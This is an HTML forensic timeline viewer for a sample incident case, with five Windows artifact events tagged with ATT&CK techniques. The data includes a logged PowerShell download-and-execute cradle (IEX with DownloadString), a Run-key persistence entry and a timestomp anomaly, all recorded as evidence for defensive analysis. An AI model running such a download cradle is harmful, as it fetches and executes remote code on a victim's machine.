<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Sample Timeline — CASE-2026-014</title>
<style>
  :root {
    --bg: #f7f7f8; --panel: #ffffff; --text: #1a1a1a; --muted: #6b7280;
    --border: #e2e2e5; --accent: #2563eb; --tag-bg: #fee2e2; --tag-text: #991b1b;
    --row-hover: #f0f4ff;
  }
  @media (prefers-color-scheme: dark) {
    :root {
      --bg: #15161a; --panel: #1d1e23; --text: #e6e6e8; --muted: #9098a4;
      --border: #33343a; --accent: #6ea8fe; --tag-bg: #4a1d1d; --tag-text: #ffb4b4;
      --row-hover: #23262f;
    }
  }
  * { box-sizing: border-box; }
  body {
    margin: 0; font-family: -apple-system, Segoe UI, Roboto, sans-serif;
    background: var(--bg); color: var(--text); font-size: 13px;
  }
  header { padding: 16px 20px; border-bottom: 1px solid var(--border); background: var(--panel); }
  h1 { margin: 0 0 4px; font-size: 18px; }
  .meta { color: var(--muted); font-size: 12px; }
  .controls {
    display: flex; flex-wrap: wrap; gap: 14px; align-items: center;
    padding: 12px 20px; background: var(--panel); border-bottom: 1px solid var(--border);
    position: sticky; top: 0; z-index: 10;
  }
  #search {
    flex: 1 1 260px; padding: 7px 10px; border: 1px solid var(--border); border-radius: 6px;
    background: var(--bg); color: var(--text); font-size: 13px;
  }
  .types { display: flex; flex-wrap: wrap; gap: 8px; }
  .types label { display: flex; align-items: center; gap: 4px; color: var(--muted); cursor: pointer; }
  #attackOnly { display: flex; align-items: center; gap: 4px; color: var(--muted); cursor: pointer; white-space: nowrap; }
  .pagination { display: flex; align-items: center; gap: 6px; white-space: nowrap; }
  .pagination button, .pagination select {
    padding: 5px 9px; border: 1px solid var(--border); border-radius: 6px;
    background: var(--bg); color: var(--text); font-size: 12px; cursor: pointer;
  }
  .pagination button:disabled { opacity: 0.4; cursor: default; }
  #pageIndicator { color: var(--muted); font-size: 12px; padding: 0 2px; }
  #count { color: var(--muted); margin-left: auto; white-space: nowrap; }
  table { width: 100%; border-collapse: collapse; }
  thead th {
    position: sticky; top: 49px; background: var(--panel); text-align: left; padding: 8px 10px;
    border-bottom: 1px solid var(--border); cursor: pointer; user-select: none; white-space: nowrap;
    font-weight: 600; color: var(--muted);
  }
  thead th:hover { color: var(--text); }
  thead th.sorted { color: var(--accent); }
  tbody td {
    padding: 6px 10px; border-bottom: 1px solid var(--border); vertical-align: top;
    max-width: 480px; overflow-wrap: break-word;
  }
  tbody tr:hover { background: var(--row-hover); }
  tbody tr.tagged { box-shadow: inset 3px 0 0 var(--tag-text); }
  .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; white-space: nowrap; }
  .badge {
    display: inline-block; background: var(--tag-bg); color: var(--tag-text);
    border-radius: 4px; padding: 1px 6px; font-size: 11px; font-weight: 600;
    margin: 1px 3px 1px 0; white-space: nowrap;
  }
  .source { color: var(--muted); font-size: 11px; }
  #empty { display: none; padding: 40px; text-align: center; color: var(--muted); }
</style>
</head>
<body>

<header>
  <h1>Sample Timeline — CASE-2026-014</h1>
  <div class="meta">Generated 2026-07-16 21:20:18 UTC &middot; <span id="totalMeta">5</span> events &middot; <span id="taggedMeta">3</span> ATT&amp;CK-tagged</div>
</header>

<div class="controls">
  <input id="search" type="text" placeholder="Search timestamp, host, action, detail, source, technique...">
  <div class="types" id="typeFilters"></div>
  <label id="attackOnly"><input type="checkbox" id="attackOnlyCheckbox"> ATT&amp;CK-tagged only</label>
  <div class="pagination">
    <button id="prevPage" title="Previous page">&larr;</button>
    <span id="pageIndicator"></span>
    <button id="nextPage" title="Next page">&rarr;</button>
    <select id="pageSize" title="Rows per page">
      <option value="100">100/page</option>
      <option value="200" selected>200/page</option>
      <option value="500">500/page</option>
      <option value="1000">1000/page</option>
    </select>
  </div>
  <span id="count"></span>
</div>

<table>
  <thead>
    <tr>
      <th data-key="timestamp">Timestamp</th>
      <th data-key="host">Host</th>
      <th data-key="artifact_type">Artifact</th>
      <th data-key="action">Action</th>
      <th data-key="detail">Detail</th>
      <th data-key="attack_techniques">ATT&amp;CK</th>
      <th data-key="source_file">Source</th>
    </tr>
  </thead>
  <tbody id="rows"></tbody>
</table>
<div id="empty">No events match the current filters.</div>

<script>
  const DATA = [{"timestamp": "2026-07-10 08:55:12.0000000", "host": "WIN10-BOB", "artifact_type": "prefetch", "action": "process_execution", "detail": "POWERSHELL.EXE (run_count=14)", "source_file": "PECmd_Output.csv", "attack_techniques": ""}, {"timestamp": "2026-07-10 09:00:00.0000000", "host": "WIN10-BOB", "artifact_type": "mft", "action": "file_created", "detail": "C:/Users/bob/Downloads/report.docx (size=2048) [mft_timestamp_anomaly: SI=2020-01-01 00:00:00.0000000 FN=2026-07-10 09:00:00.0000000]", "source_file": "MFTECmd_$MFT_Output.csv", "attack_techniques": "T1070.006"}, {"timestamp": "2026-07-10 09:02:31.0000000", "host": "WIN10-BOB", "artifact_type": "registry", "action": "Run Key", "detail": "HKU/S-1-5-21.../Software/Microsoft/Windows/CurrentVersion/Run/Updater = C:/Users/bob/AppData/Roaming/upd.exe", "source_file": "RECmd_Batch_Output.csv", "attack_techniques": "T1547.001"}, {"timestamp": "2026-07-10 09:03:10.0000000", "host": "WIN10-BOB", "artifact_type": "event_log", "action": "event_id_4104", "detail": "PowerShell ScriptBlock: IEX (New-Object Net.WebClient).DownloadString(...)", "source_file": "EvtxECmd_Output.csv", "attack_techniques": ""}, {"timestamp": "2026-07-10 09:10:45.0000000", "host": "WIN10-BOB", "artifact_type": "event_log", "action": "event_id_4624", "detail": "logon_type_10 from 10.0.0.55 (RDP)", "source_file": "EvtxECmd_Output.csv", "attack_techniques": "T1021"}];
  const ARTIFACT_TYPES = ["event_log", "mft", "prefetch", "registry"];

  const state = {
    search: "", types: new Set(ARTIFACT_TYPES), attackOnly: false,
    sortKey: "timestamp", sortDir: 1, page: 0, pageSize: 200
  };

  const typeFiltersEl = document.getElementById("typeFilters");
  ARTIFACT_TYPES.forEach(t => {
    const label = document.createElement("label");
    const cb = document.createElement("input");
    cb.type = "checkbox"; cb.checked = true; cb.dataset.type = t;
    cb.addEventListener("change", () => {
      if (cb.checked) state.types.add(t); else state.types.delete(t);
      state.page = 0;
      render();
    });
    label.appendChild(cb);
    label.appendChild(document.createTextNode(" " + t));
    typeFiltersEl.appendChild(label);
  });

  document.getElementById("attackOnlyCheckbox").addEventListener("change", (e) => {
    state.attackOnly = e.target.checked;
    state.page = 0;
    render();
  });

  let searchTimer = null;
  document.getElementById("search").addEventListener("input", (e) => {
    clearTimeout(searchTimer);
    const value = e.target.value;
    searchTimer = setTimeout(() => { state.search = value.toLowerCase(); state.page = 0; render(); }, 120);
  });

  document.querySelectorAll("thead th[data-key]").forEach(th => {
    th.addEventListener("click", () => {
      const key = th.dataset.key;
      if (state.sortKey === key) { state.sortDir *= -1; } else { state.sortKey = key; state.sortDir = 1; }
      document.querySelectorAll("thead th").forEach(h => h.classList.remove("sorted"));
      th.classList.add("sorted");
      state.page = 0;
      render();
    });
  });

  document.getElementById("prevPage").addEventListener("click", () => { state.page -= 1; render(); });
  document.getElementById("nextPage").addEventListener("click", () => { state.page += 1; render(); });
  document.getElementById("pageSize").addEventListener("change", (e) => {
    state.pageSize = parseInt(e.target.value, 10);
    state.page = 0;
    render();
  });

  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({
      "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
    })[c]);
  }

  function matches(row) {
    if (!state.types.has(row.artifact_type)) return false;
    if (state.attackOnly && !row.attack_techniques) return false;
    if (!state.search) return true;
    return TIMELINE_FIELDS_JS.some(k => (row[k] || "").toLowerCase().includes(state.search));
  }

  const TIMELINE_FIELDS_JS = ["timestamp", "host", "artifact_type", "action", "detail", "source_file", "attack_techniques"];

  function render() {
    const filtered = DATA.filter(matches);
    filtered.sort((a, b) => {
      const av = (a[state.sortKey] || ""), bv = (b[state.sortKey] || "");
      return av < bv ? -state.sortDir : av > bv ? state.sortDir : 0;
    });

    const tbody = document.getElementById("rows");
    const empty = document.getElementById("empty");
    const prevBtn = document.getElementById("prevPage");
    const nextBtn = document.getElementById("nextPage");
    const pageIndicator = document.getElementById("pageIndicator");

    if (filtered.length === 0) {
      tbody.innerHTML = "";
      empty.style.display = "block";
      document.getElementById("count").textContent = `Showing 0 of ${DATA.length}`;
      pageIndicator.textContent = "Page 0 of 0";
      prevBtn.disabled = true;
      nextBtn.disabled = true;
      return;
    }
    empty.style.display = "none";

    // Only the current page's rows are ever built and inserted into the
    // DOM — a real timeline can have tens or hundreds of thousands of
    // rows (a single MFT can produce that many on its own), and building
    // one giant <tbody> for all of them is what crashes the tab.
    const pageCount = Math.max(1, Math.ceil(filtered.length / state.pageSize));
    state.page = Math.min(Math.max(state.page, 0), pageCount - 1);
    const start = state.page * state.pageSize;
    const pageRows = filtered.slice(start, start + state.pageSize);

    document.getElementById("count").textContent =
      `Rows ${start + 1}-${start + pageRows.length} of ${filtered.length} (${DATA.length} total)`;
    pageIndicator.textContent = `Page ${state.page + 1} of ${pageCount}`;
    prevBtn.disabled = state.page === 0;
    nextBtn.disabled = state.page >= pageCount - 1;

    tbody.innerHTML = pageRows.map(row => {
      const techniques = row.attack_techniques
        ? row.attack_techniques.split(";").filter(Boolean).map(t => `<span class="badge">${escapeHtml(t)}</span>`).join("")
        : "";
      const tagged = row.attack_techniques ? "tagged" : "";
      return `<tr class="${tagged}">
        <td class="mono">${escapeHtml(row.timestamp)}</td>
        <td>${escapeHtml(row.host)}</td>
        <td>${escapeHtml(row.artifact_type)}</td>
        <td>${escapeHtml(row.action)}</td>
        <td>${escapeHtml(row.detail)}</td>
        <td>${techniques}</td>
        <td class="source" title="${escapeHtml(row.source_file)}">${escapeHtml(row.source_file)}</td>
      </tr>`;
    }).join("");
  }

  document.querySelector('thead th[data-key="timestamp"]').classList.add("sorted");
  render();
</script>
</body>
</html>
